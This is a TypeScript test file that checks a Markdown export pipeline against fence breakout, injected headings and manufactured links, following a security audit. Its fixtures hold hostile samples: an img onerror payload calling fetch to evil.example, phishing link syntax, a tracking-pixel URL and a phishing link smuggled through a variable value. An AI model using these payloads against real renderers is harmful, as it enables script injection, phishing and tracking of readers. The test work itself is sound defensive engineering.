import { describe, it, expect } from "vitest";
import MarkdownIt from "markdown-it";
import { htmlToMarkdown, substituteVariableValues } from "../export";

/**
 * Findings from the independent security audit (2026-08-05) of the export
 * pipeline. Threat model: user A authors a document, it is exported, and user
 * B opens the `.md` — in VS Code's preview, in `marked`, in markdown-it with
 * `html: true`, or in any static-site generator. All of those render raw HTML
 * by default or by common configuration.
 *
 * Every assertion renders the produced Markdown and inspects the RESULT rather
 * than pattern-matching the source, because the thing being guaranteed is
 * "no live element, no hijacked structure", not a particular escape spelling.
 */
const render = (md: string) => {
  const html = new MarkdownIt({ html: true }).render(md);
  const host = document.createElement("div");
  host.innerHTML = html;
  return host;
};

describe("markdown export cannot be escaped from (R32-9)", () => {
  it("a code block containing a fence does not break out of its own fence", () => {
    const payload =
      "hello\n```\n<img src=x onerror=\"fetch('https://evil.example')\">";
    const md = htmlToMarkdown(
      `<pre><code>${payload
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")}</code></pre>`
    );

    const out = render(md);
    // The payload must remain INSIDE the code block, as text.
    expect(out.querySelector("img")).toBeNull();
    expect(out.querySelector("code")?.textContent).toContain("onerror");
  });

  it("a code block cannot inject document structure after itself", () => {
    const payload = "sample\n```\n# Attacker heading\n\nbody text";
    const md = htmlToMarkdown(
      `<pre><code>${payload.replace(/</g, "&lt;")}</code></pre>`
    );

    const out = render(md);
    // No real heading may materialize from inside the block.
    expect(out.querySelector("h1")).toBeNull();
    expect(out.querySelector("code")?.textContent).toContain("# Attacker heading");
  });

  it("an inline code span containing a backtick stays one span", () => {
    const md = htmlToMarkdown("<p>run <code>a`b</code> now</p>");
    const out = render(md);

    const code = out.querySelector("code");
    expect(code?.textContent).toBe("a`b");
    expect(out.textContent).toContain("run");
    expect(out.textContent).toContain("now");
  });

  it("ordinary code still round-trips unpadded (control)", () => {
    const md = htmlToMarkdown("<p>use <code>npm ci</code></p>");
    expect(md).toContain("`npm ci`");
    expect(render(md).querySelector("code")?.textContent).toBe("npm ci");
  });

  it("a normal fenced block still uses a three-backtick fence (control)", () => {
    const md = htmlToMarkdown(
      '<pre><code class="language-js">const a = 1</code></pre>'
    );
    expect(md).toContain("```js\nconst a = 1\n```");
  });
});

describe("markdown export does not manufacture links (R32-8)", () => {
  it("link syntax in prose stays literal text", () => {
    const md = htmlToMarkdown(
      "<p>Please read [our policy](https://evil.example/phish) before Monday.</p>"
    );
    const out = render(md);

    expect(out.querySelector("a")).toBeNull();
    expect(out.textContent).toContain("[our policy](https://evil.example/phish)");
  });

  it("image syntax cannot become an auto-loading remote image", () => {
    const md = htmlToMarkdown(
      "<p>Report ![](https://evil.example/pixel.png?doc=42) ready.</p>"
    );
    const out = render(md);

    expect(out.querySelector("img")).toBeNull();
    expect(out.textContent).toContain("pixel.png");
  });

  it("a VARIABLE value cannot become a phishing link", () => {
    // Variable values are host-supplied — a CRM field, an API response —
    // so this is not something the document's author chose to type.
    const doc =
      '<p>Hello <span class="editor-variable" data-variable="user.name" ' +
      'data-value="[Click to verify](https://evil.example/phish)">' +
      "{{ user.name }}</span>.</p>";

    const out = render(htmlToMarkdown(substituteVariableValues(doc)));

    expect(out.querySelector("a")).toBeNull();
    expect(out.textContent).toContain("Click to verify");
  });

  it("real links authored as links still export as links (control)", () => {
    const md = htmlToMarkdown('<p>See <a href="https://example.com/x">docs</a>.</p>');
    const out = render(md);

    const link = out.querySelector("a");
    expect(link?.getAttribute("href")).toBe("https://example.com/x");
    expect(link?.textContent).toBe("docs");
  });

  it("plain prose is not littered with backslashes (control)", () => {
    const out = render(htmlToMarkdown("<p>A normal sentence, nothing odd.</p>"));
    expect(out.textContent?.trim()).toBe("A normal sentence, nothing odd.");
  });
});
